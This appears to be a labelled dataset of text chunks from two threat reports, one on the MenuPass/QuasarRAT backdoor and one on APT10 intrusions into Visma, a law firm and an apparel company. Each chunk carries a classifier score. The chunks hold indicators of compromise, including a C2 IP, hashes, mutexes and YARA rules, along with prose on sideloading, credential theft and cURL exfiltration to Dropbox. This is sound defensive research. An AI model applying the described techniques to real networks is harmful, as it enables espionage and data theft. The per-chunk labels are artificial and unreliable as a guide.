        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6942164897918701
        },
        "prediction": {}
    },
    {
        "text": "Size of the initial loader: 341 \u2013 394 KB\n2nd stage + loader size: 236,532 bytes\nSecond stage decryption moved back to ServiceMain\n\nVariants:\n\nSHA256\n\nVariant\n\nSize\n\nFile Names\n\ne24f56ed330e37b0d52d362eeb66c148d09c25721b1259900c1da5e16f70230a\n\n1\n\n153600\n\nprints.dll\n\n9bbc5b8ad7fb4ce7044a2ced4433bf83b4ccc624a74f8bafb1c5932c76511308\n\n1\n\n153600\n\nEntApp.dll\n\nfe65e5c089f8a09c8a526ae5582aef6530e1139d4a995eb471349de16e76ec71\n\n1\n\n153600\n\nLSMsvc.dll\n\ncf08dec0b2d1e3badde626dbbc042bc507733e2454ae9a0a7aa256e04af0788d\n\n1\n\n155136\n\nuseracc.dll\n\n239e9bc49de3e8087dc5e8b0ce7494dabce974de220b0b04583dec5cd4af35e5\n\n2\n\n166912\n\nSezlnsrsvc.dll\n\ncf981bda89f5319a4a30d78e2a767c54dc8075dd2a499ddf79b25f12ec6edd64\n\n2\n\n166912\n\nwlytkansvc.dll\n\n41081e93880cc7eaacd24d5846ae15016eb599d745809e805deedb0b2f7d0859\n\n2\n\n166912\n\nWbyfziosrvc.dll\n\n1ddb533be5fa167c9a6fce5d1777690f26f015fcf4bd82efebd0c5c0b1e135f2\n\n2\n\n167728\n\ntk.dll\n\n26866d6dcb229bf6142ddfdbf59bc8709343f18b372f3270d01849253f1caafb\n\n3\n\n268872\n\nMpnrrdim.dll\n\n7f7fc0db3ea3545f114ed41853e4dc3764addfa352c28b1f6643d3fdaf7076c5\n\n3\n\n268872\n\nWitwaservc.dll\n\nc8c707575bb87c17ec17c4517c99229a993f80a76261191b2b89d3cb88e24aea\n\n3\n\n268872\n\nIcyowsvcext.dll\n\n6037b5ce5e7eda68972c7d6dfe723968bea7b40ac05b0f8c779a1f1d542b4ae4\n\n3\n\n268872\n\nUpqmnnphost.dll\n\ncc02561e5632a2c8b509761ee7a23a75e3899441f9c77d778d1a770f0f82a9b7\n\n5\n\n297984\n\nPnniorpauto.dll, SvchostSvc.dll\n\nc8f2cc7c4fdf8a748cb45f6cfb21dd97655b49dd1e13dd8cc59a5eab69cc7017\n\n5\n\n297984\n\nUsyaerDataAccessRes.dll\n\n0eff243e1253e7b360402b75d7cb5bd2d3b608405daece432954379a56e27bff\n\n6\n\n403948\n\n11-PrivateBatch.dll\n\n31f0ff80534007c054dcdbaf25f2449ee7856aceac2962f4d8463f89f61bb3b0\n\n6\n\n399280\n\nWostqrkfolderssvc.dll\n\ne8f00263b47b8564da9bc2029a18a0fec745377372f6f65a21aa2762fc626d4c\n\n6\n\n400947\n\n11-PrivateBatch.dll\n\n56f727b3ced15e9952014fc449b496bfcf3714d46899b4bb289d285b08170138\n\n6\n\n358867\n\ndaoris.dll\n\n721caf6de3086cbab5a3a468b21b039545022c39dc5de1d0f438c701ecc8e9df\n\n6\n\n349810\n\nupdgwnphost.dll\n\nf8a7e8a52de57866c6c01e9137a283c35cd934f2f92c5ace489b0b31e62eebe7\n\n6\n\n377236\n\nUSHBEERDATAACCESSRES.DLL, 10-FileCopy.dll\n\nf1c5a9ad5235958236b1a56a5aa26b06d0129476220c30baf0e1c57038e8cddb\n\nN/A[1]\n\n79360\n\nZpNxNaQ.dll, SvchostSvc.dll\n\n0aa3d394712452bba79d7a524a54aa871856b4d340daae5bf833547da0f1d844\n\nN/A4\n\n73728\n\nSvchostSvc.dll\n\n\nSummary:\n\nIn testing, CylancePROTECT\u00ae detects and prevents QuasaRAT and its variants.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.11093481630086899
        },
        "prediction": {}
    },
    {
        "text": "In fact, our AI-driven security agents demonstrated a predictive advantage[5] of over three years against the majority of current QuasarRAT samples.\n",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6388682126998901
        },
        "prediction": {}
    },
    {
        "text": "Indicators of compromise (IOCs):\n\nIndicator\n\nType\n\nCONVENTION DIGITAL LTD\n\nCertificate\n\n52 25 B8 E2 2D 3B BC 97 3F DD 24 2F 2C 2E 70 0C\n\nCertificate serial\n\nFuckYouAnti\n\nDLL Export\n\n195.54.163.74 \n\nC2 IP\n\n9s1IUBvnvFDb76ggOFFmnhIK\n\nMutex\n\nERveMB6XRx2pmYdoKjMnoN1f\n\nMutex\n\nABCDEFGHIGKLMNOPQRSTUVWXYZ\n\nMutex\n\nAntiLib\\injectcode.cpp\n\nPDB path\n\nAntiLib\\enableDebugPriv.cpp\n\nPDB path\n\nC:\\ods.log\n\nFilename\n\n\nYARA\n\nThe following YARA rule can be used to identify QuasarRAT loaders:\n\n\u00a0\u00a0import \"pe\"\n\u00a0 rule QuasarRAT_Loader\n\u00a0 {\n\u00a0 \u00a0 \u00a0 meta:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 description = \"MenuPass/APT10 QuasarRAT Loader\"\n\u00a0 \u00a0 \u00a0 strings:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 $rdata1 = \" ! \\\"#$%&'()*+,-\n./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~\" ascii\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 $rdata2 = \"CONOUT$\" wide\n\u00a0 \u00a0 \u00a0 condition:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 // Has MZ header?\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 uint16(0) == 0x5a4d and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 // File size less than 600KB\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 filesize <",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.12640517950057983
        },
        "prediction": {}
    },
    {
        "text": "600KB and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 // Is a DLL?\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 pe.characteristics & pe. DLL and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 // Contains the following sections (in order)\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 pe.section_index(\".text\") == 0 and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 pe.section_index(\".rdata\") == 1 and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 pe.section_index(\".data\") == 2 and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 pe.section_index(\".pdata\") == 3 and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 pe.section_index(\".rsrc\") == 4 and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 pe.section_index(\".reloc\") == 5 and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 // Has the following export\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 pe.exports(\"ServiceMain\") and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 // Does not have the following export\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 not pe.exports(\"WUServiceMain\") and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 // Has the following imports\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 pe.imports(\"advapi32.dll\", \"RegisterServiceCtrlHandlerW\") and\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 // Contains the following strings in .rdata\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 for all of ($rdata*) : ( $ in\u00a0 \u00a0 \u00a0 \u00a0\n\u00a0 (pe.sections[pe.section_index(\".rdata\")].raw_data_offset..pe.sections[pe.section_index\n(\".rdata\")].raw_data_offset+pe.sections[pe.section_index(\".rdata\")].raw_data_size) )\n\u00a0 }\n\n\n\nThe following YARA rule can be useful for detecting possible high-entropy payloads stored within the\u00a0%WINDOWS%\\Microsoft. NET\\Framework folder (these files typically have a double file extension):\u00a0\n\n\u00a0 import \"pe\"\n\u00a0 import \"math\"\n\u00a0 rule Possible_QuasarRAT_Payload\n\u00a0 {\n\u00a0 \u00a0 \u00a0 meta:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 description = \"Possible encrypted QuasarRAT payload\"\n\u00a0 \u00a0 \u00a0 condition:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 uint16(0) !",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.15685826539993286
        },
        "prediction": {}
    },
    {
        "text": "0x4947 and\u00a0\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 math.entropy(0, filesize) > 7.5\n\u00a0 }\n\n\n\u00a0\nCitations:\n [1] https://github.com/quasar/QuasarRAT\n [2] https://code.msdn.microsoft.com/windowsdesktop/CppHostCLR-e6581ee0\n [3] https://github.com/quasar/QuasarRAT\n [4] Service installer (a.k.a DILLJUICE)\n  [5] https://threatvector.cylance.com/en_us/home/cylance-vs-future-threats-the-predictive-advantage.html\n\n\n\n\n\n\n\n\nAbout The BlackBerry Cylance Threat Research Team\n     The BlackBerry Cylance Threat Research team examines malware and suspected malware to better identify its abilities, function and attack vectors.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.29075169563293457
        },
        "prediction": {}
    },
    {
        "text": "Threat Research is on the frontline of information security and often deeply examines malicious software, which puts us in a unique position to discuss never-seen-before threats.\n\n\n\n\n\n\n\n\n\n",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6125761270523071
        },
        "prediction": {}
    },
    {
        "text": "Share on Twitter\n\n\n\n\n\n\n\nShare on Facebook\n\n\n\n\n\n\n\nShare on Linked In\n\n\n\n\n\n\n\nEmail\n\n\n\n\n\n\n\n\n\nBack\n\n\n\n\n\n\n\n\n\n\n\n\n\nFacebook\n\n\n\n\n\n\nTwitter\n\n\n\n\n\nYouTube\n\n\n\n\n\nInstagram\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCorporate\n                              \n\n\n\n\n\n\n\n\n\n\nCompany\n\n\nNewsroom\n\n\nInvestors\n\n\nCareers\n\n\nLeadership\n\n\nCorporate Responsibility\n\n\nCertifications\n\n\nCustomer Success\n\n\n\n\n\n\n\nDevelopers\n                              \n\n\n\n\n\n\n\n\n\n\nEnterprise Platform & Apps\n\n\nBlackBerry QNX Developer Network\n\n\n\n\nBlogs\n                              \n\n\n\n\n\n\n\n\n\n\nBlackBerry ThreatVector Blog\n\n\nDevelopers Blog\n\n\nHelp Blog\n\n\n\n\n\n\n\nLegal\n                              \n\n\n\n\n\n\n\n\n\n\nOverview\n\n\nAccessibility\n\n\nPatents\n\n\nTrademarks\n\n\nPrivacy Policy\n\n\n\n\n\n\n\n\n\n\n                        ",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.4929220378398895
        },
        "prediction": {}
    },
    {
        "text": "BlackBerry uses cookies to help make our website better. Some of the cookies are necessary for proper functioning of the site, while others are to help us understand how you use it.\u00a0",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6663946509361267
        },
        "prediction": {}
    },
    {
        "text": "CYBER THREAT ANALYSIS\nAPT10 Targeted Norwegian\nMSP and US Companies in\nSustained Campaign\nIntrusions Highlight Ongoing Exposure of Third-Party Risk\nBy Insikt Group\nCo-Authored by Rapid7\nCTA-2019-0206CYBER THREAT ANALYSIS\nRecorded Future analyzed an intrusion into one of our client\u2019s networks and\ncollaborated with Rapid7 to determine the scope of a cyberespionage campaign\nassessed to be conducted by a Chinese state-sponsored threat actor, APT10. This report\ndetails the campaign using data acquired from targeted host networks, the Recorded\nFuture\u00ae Platform, network metadata, VirusTotal, Farsight DNS, Shodan, and other\nOSINT techniques.\n Norwegian company Visma, which was targeted in the attack, and U.S. company\nRapid7 provided support and extensive expertise throughout this research. Industry\ncollaboration is a vital enabler in illuminating threats and offering protection to\norganizations at risk from hostile, state-sponsored economic cyberespionage.\n This report will be of most value to network defenders and corporate risk executives\nwithin companies that utilize services from managed IT service providers and cloud\nhosting providers. The report will also be of interest to companies with an exposed\nthird-party supply chain.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.19810031354427338
        },
        "prediction": {}
    },
    {
        "text": "Executive Summary\nA sustained cyberespionage campaign targeting at least three\ncompanies in the United States and Europe was uncovered\nby Recorded Future and Rapid7 between November 2017 and\nSeptember 2018. Based on the technical data uncovered, and in\nlight of recent disclosures by the U.S. Department of Justice on\nthe ongoing activities of Chinese state-sponsored threat actors, we\nassess with high confidence that these incidents were conducted by\nAPT10 (also known as Stone Panda, menuPass, CVNX) in an effort\nto gain access to networks and steal valuable intellectual property\nor gain commercial advantage.\n The targeted companies included:\n\u2022 IT and business cloud services managed service provider\n(MSP) and Recorded Future client and supplier, Visma, a\nbillion-dollar Norwegian company with at least 850,000\ncustomers globally\n\u2022 An international apparel company\n\u2022 A U.S. law firm with strong experience in intellectual property\nlaw with clients in the pharmaceutical, technology, electronics,\nbiomedical, and automotive sectors, among others\n In all three incidents, the attackers gained access to networks\nthrough deployments of Citrix and LogMeIn remote-access software\nusing stolen valid user credentials. The attackers then enumerated\naccess and conducted privilege escalation on the victim networks,\nRecorded Future | www.recordedfuture.com",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.17750318348407745
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 1 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 2CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nutilizing DLL sideloading techniques documented in a US-CERT alert\non APT10 to deliver malware. During the Visma intrusion, APT10\ndeployed their Trochilus malware with command and control (C2)\ncommunications encrypted using both RC4 and Salsa20 streaming\nciphers rather than the typically observed RC4 variant. On the two\nother victim networks, the attackers deployed a unique version of\nthe UPPERCUT (ANEL) backdoor, known to have only been used by\nAPT10.\n APT10 actors then compressed proprietary data from Visma using\nWinRAR (deployed by the attackers) and exfiltrated to a Dropbox\naccount using the cURL for Windows command-line tool. The same\nDropbox account was also accessed in a similar fashion by the\nattackers during the apparel company intrusion. Dropbox was also\nused to store exfiltrated documents from the third victim, a U.S.\nlaw firm, with the files again exfiltrated using identical TTPs and\nuploaded using cURL for Windows.\n We believe APT10 is the most significant Chinese state-sponsored\ncyber threat to global corporations known to date.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.13209733366966248
        },
        "prediction": {}
    },
    {
        "text": "On top of the\nbreadth, volume, and targets of attacks that APT10 has conducted\nsince at least 2016, we now know that these operations are being\nrun by the Chinese intelligence agency, the Ministry of State Security\n(MSS).\n  Utilizing actors working for shell companies such as Huaying Haitai\nScience and Technology Development Co Ltd (\u5929\u6d25\u534e\u76c8\u6d77\u6cf0\u79d1\u6280\u53d1\u5c55\n\u6709\u9650\u516c\u53f8), and under the direct supervision of their regional bureau\nin Tianjin, the MSS has conducted an unprecedented campaign,\ndubbed \u201cOperation Cloud Hopper,\u201d against managed IT service\nproviders (MSPs) designed to steal intellectual property and enable\nsecondary attacks against their clients.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.33046987652778625
        },
        "prediction": {}
    },
    {
        "text": "Access to the networks of\nthese third-party service providers grants the MSS the ability to\npotentially access the networks of hundreds, if not thousands,\nof corporations around the world.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6729248762130737
        },
        "prediction": {}
    },
    {
        "text": "We assess that APT10 likely\ncompromised Visma with the primary goal of enabling secondary\nintrusions onto their client networks, and not of stealing Visma\nintellectual property.\n  In this same time frame, APT10 also targeted a U.S. law firm and\nan international apparel company, likely to gather information for\ncommercial advantage.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5610173344612122
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 2CYBER THREAT ANALYSIS\npreviously acquired legitimate credentials, possibly gained via a\nthird-party supply chain compromise in order to gain initial access\nto the law firm and the apparel company.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5893537402153015
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future timeline of APT10 activity between August 2018 and January 2019.\n Key Judgments\n\u2022 We have identified a new variant of Trochilus malware, with\nits C2 communications encrypted using a combination of RC4\nand Salsa20 stream ciphers.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.48643651604652405
        },
        "prediction": {}
    },
    {
        "text": "An UPPERCUT backdoor was identified in the targeting of\nan international apparel company and U.S. law firm. The\nbackdoor was deployed using the Notepad++ updater and\nsideloading malicious DLL, as noted in APT10\u2019s targeting of\nJapanese corporations in July 2018.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.626757800579071
        },
        "prediction": {}
    },
    {
        "text": "In addition to using Trochilus and UPPERCUT, APT10 utilized a\nseries of previously known and associated attack TTPs for all\nthree of these intrusions. Some of these TTPs include:\n\u2022 Transferring tools from the C2 to the host using\nBITSAdmin-scheduled tasks into C:\\ProgramData\\temp\nRecorded Future | www.recordedfuture.com",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5421924591064453
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 3 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 4CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\n\u2022 Use of DLL sideloading by executing a legitimate\nbinary to load a renamed malicious DLL that decrypts,\ndecompresses, and injects a Trochilus payload into\nmemory\n\u2022 Use of legitimate credentials, possibly acquired through\nprevious MSP compromises, to log in to accessible Citrix\nRemote Desktop clients in targeted organizations\nRecorded Future | www.recordedfuture.com | CTA-2019-0206 | 4CYBER THREAT ANALYSIS\nRecorded Future | www.recordedfuture.com | CTA-2019-0206 | 37 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 37CYBER THREAT ANALYSIS\nBackground\nAPT10 is a threat actor that has been active since at least 2009.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.2210405170917511
        },
        "prediction": {}
    },
    {
        "text": "It has\nhistorically targeted healthcare, defense, aerospace, government,\nheavy industry and mining, and MSPs and IT services, as well as\nother sectors, for probable intellectual property theft.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.3596135973930359
        },
        "prediction": {}
    },
    {
        "text": "In early 2017, APT10 began conducting attacks against global\nmanaged IT service providers (MSPs) that granted them\nunprecedented access to MSPs and their customers\u2019 networks.\n During this operation (dubbed \u201c\u2018Cloud Hopper\u201d because of the\ngroup\u2019s use of popular western cloud-based services), APT10 utilized\nboth new malware (Quasar RAT, Trochilus, RedLeaves, ChChes) as\nwell as some familiar old tools (Poison Ivy, PlugX).\n Most recently, on December 20, 2018, the U.S. Department of Justice\ncharged two hackers associated with the Chinese Ministry of State\nSecurity (MSS) with global computer intrusion campaigns targeting\nintellectual property. This indictment attributed the intrusions to\nAPT10, a group that had been conducting the malicious activities\nfor over a decade on behalf of the MSS, China\u2019s civilian human\nintelligence agency. Some of the material included within the\nindictment corroborated information detailed in the Intrusion Truth\nblog that provided strong evidence attributing APT10 to the Tianjin\nState Security Bureau, a provincial bureau of the Ministry of State\nSecurity. In the blog, Intrusion Truth identified APT10 as having\nutilized several Tianjin-based companies, including Huaying Haitai\nScience and Technology Development Co. Ltd. and Laoying Baichen\nInstruments Equipment Co. Ltd.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.12991677224636078
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 5 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 6CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nU.S. Department of Justice indictment of APT10 threat actors.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.2885240316390991
        },
        "prediction": {}
    },
    {
        "text": "The use of suspected shell companies as a front for MSS-enabled\ncyber activity isn\u2019t a new observation, however.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.686423122882843
        },
        "prediction": {}
    },
    {
        "text": "Our research from\n2017 concluded that Guangdong ITSEC (and therefore the MSS)\ndirected the activities of a company named Boyusec, which was\nidentified as a shell company for APT3.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.633249044418335
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 6CYBER THREAT ANALYSIS\nThe December APT10 indictment noted that the group\u2019s malicious\nactivities breached at least 45 companies and managed service\nproviders in 12 countries, including Brazil, Canada, Finland, France,\nGermany, India, Japan, Sweden, Switzerland, the United Arab\nEmirates, the United Kingdom, and the United States.\n ",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.4906393587589264
        },
        "prediction": {}
    },
    {
        "text": "About Visma\nVisma offers software and services that simplify and digitize\ncore business processes in the private and public sector.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6311314702033997
        },
        "prediction": {}
    },
    {
        "text": "The\nVisma group operates across the entire Nordic region along with\nBenelux, Central, and Eastern Europe.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.697814404964447
        },
        "prediction": {}
    },
    {
        "text": "With 8,500 employees, more\nthan 850,000 customers, and a net revenue of NOK 8,537 million\n(approximately $1 billion USD) in 2017, Visma is one of Europe\u2019s\nleading software companies.\n ",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.48999714851379395
        },
        "prediction": {}
    },
    {
        "text": "Intrusion Overview\nRecorded Future\u2019s Insikt Group has actively tracked APT10 for\nseveral years, focusing specifically on the group\u2019s targeting of MSPs\nand global internet infrastructure providers since the Operation\nCloud Hopper report in 2017.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6332418918609619
        },
        "prediction": {}
    },
    {
        "text": "We were particularly interested in\nidentifying whether any customers of the targeted MSPs were\nsubsequently compromised by APT10, given their potential access\nthrough compromised MSP networks.\n ",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6487577557563782
        },
        "prediction": {}
    },
    {
        "text": "In September 2018, one of our clients (and a supplier as well),\nVisma, reached out to us for assistance in investigating an incident\nuncovered on their network following a breach notification by\nRapid7.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5470646619796753
        },
        "prediction": {}
    },
    {
        "text": "Analysis of the data revealed that Visma\u2019s Citrix\ninfrastructure had been probed and subsequently accessed using\nstolen credentials as early as August 17, 2018. This was followed\nby an initial exploitation, network enumeration, and malicious tool\ndeployment on various Visma endpoints within two weeks of initial\naccess. The theft of enterprise login credentials was conducted\nwithin two and a half weeks of initial access.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5127042531967163
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 7 Recorded Future | www.recordedfuture.com | CTA-2019-0206 |",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.3771930932998657
        },
        "prediction": {}
    },
    {
        "text": "8CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nOn August 30, 2018, APT10 deployed their first modified version\nof Trochilus that had its C2 communications encrypted using\nSalsa20 and RC4-encrypted Trochilus variant seen in the wild. This\nsample, similar to other Trochilus samples, was deployed using a\nDLL sideloading method utilizing three files, uploaded to the same\nfolder on the victim machine as identified in US-CERT advisory TA17-\n117A (last revised on December 20, 2018). This method involves the\nuse of a legitimate binary (File 1) used to load a malicious DLL (File\n2).",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.4277224838733673
        },
        "prediction": {}
    },
    {
        "text": "The malicious DLL is renamed to match the name of an expected\nDLL to be loaded by the executable.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.7396631836891174
        },
        "prediction": {}
    },
    {
        "text": "The malicious DLL then decrypts\nand decompresses shellcode contained within a third file placed by\nthe attackers in the same temporary folder.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.710716962814331
        },
        "prediction": {}
    },
    {
        "text": "The configuration file\nthen loads the Trochilus payload into memory by injecting it into a\nvalid system process.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.7371428608894348
        },
        "prediction": {}
    },
    {
        "text": "The attackers used Mimikatz (pd.exe) to enable credential theft and\nmade use of scheduled tasks via the Microsoft BITSAdmin utility\nto transfer files from their C2 to the Visma network. The attackers\npreferred to upload their malicious tooling to the C:\\ProgramData\\\ntemp or C:\\ProgramData\\media directories and executed commands\nusing batch files (x.bat).",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5551231503486633
        },
        "prediction": {}
    },
    {
        "text": "A full list of the filenames of the suspected\nattacker tooling can be found in the report appendices.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.7317073941230774
        },
        "prediction": {}
    },
    {
        "text": "BITSAdmin example commands used by the attackers.\n In order to exfiltrate the compromised data, the attackers employed\ncustom malware that used Dropbox as its C2. They also used\nWinRAR and cURL for Windows, both often renamed, to compress\nand upload the exfiltrated files from the Visma network to the\nDropbox API.\n Our research partner Rapid7 investigated the Dropbox use and\nfound that the attackers had used the same account to store\nexfiltrated data from a global apparel company.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5201209187507629
        },
        "prediction": {}
    },
    {
        "text": "8CYBER THREAT ANALYSIS\nbroadly similar TTPs being used in the attack against a U.S. law firm\nspecializing in intellectual property law. The firm has a dedicated\nChina practice aimed at assisting Chinese companies entering the\nU.S. market.\n Rapid7\u2019s investigation revealed the law firm was first targeted in\nJapanese forum post within a dark web community asking if anyone speaks an Asian language.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.578336775302887
        },
        "prediction": {}
    },
    {
        "text": "late 2017, followed by the apparel company a few months later,\nSource: Recorded Future\nand finally, the Visma attack in August 2018.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6339531540870667
        },
        "prediction": {}
    },
    {
        "text": "In one of the attacks,\nRapid7 identified the attackers escaping a Citrix application in order\nto run the payload script on the victim desktop.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.7050663232803345
        },
        "prediction": {}
    },
    {
        "text": "Interestingly, in all\nthree attacks, the targeting of Citrix remote desktops was a common\nthread.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6524501442909241
        },
        "prediction": {}
    },
    {
        "text": "Additionally, the same DLL sideloading technique observed\nin the Visma attack was used, and many of the tools deployed by\nthe attackers shared naming similarities as well (1.bat, cu.exe,\nss.rar, r.exe, pd.exe).",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5403732657432556
        },
        "prediction": {}
    },
    {
        "text": "Most interestingly, Rapid7 observed the use\nof the Notepad++ updater gup.exe as a legitimate executable to\nsideload a malicious DLL (libcurl.dll) in order to deploy a variant\nof the UPPERCUT backdoor (also known as ANEL).",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6373381614685059
        },
        "prediction": {}
    },
    {
        "text": "APT10 used\nthis approach to deploy UPPERCUT when targeting Japanese\ncorporations in July 2018.\n  The Visma Attack\nAPT10 actors gained initial access to the Visma network around\nAugust 17, 2018.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6744111180305481
        },
        "prediction": {}
    },
    {
        "text": "Examination of network logs revealed an employee\u2019s\ncredentials were stolen and used to authenticate to the network\noutside of her normal working hours.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6849067211151123
        },
        "prediction": {}
    },
    {
        "text": "While we are confident that\nAPT10 actors gained access to the Visma network in August using\nstolen employee Citrix remote desktop credentials, it is not clear\nhow or when these credentials were initially compromised.\n ",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.634323239326477
        },
        "prediction": {}
    },
    {
        "text": "Throughout August 2018, the APT10 actors regularly logged in to\nthe Visma network via accessible Citrix servers using two valid user\naccounts.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.7360721230506897
        },
        "prediction": {}
    },
    {
        "text": "The times of the logins were consistent with a GMT+8\ntimezone, indicative of typical Tianjin, China working hours.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6724774241447449
        },
        "prediction": {}
    },
    {
        "text": "On\neach occasion, the logins were from one of eight VPN endpoints\nthat resolved to IPs in the following tightly defined subnets:\nRecorded Future | www.recordedfuture.com",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5740721225738525
        },
        "prediction": {}
    },
    {
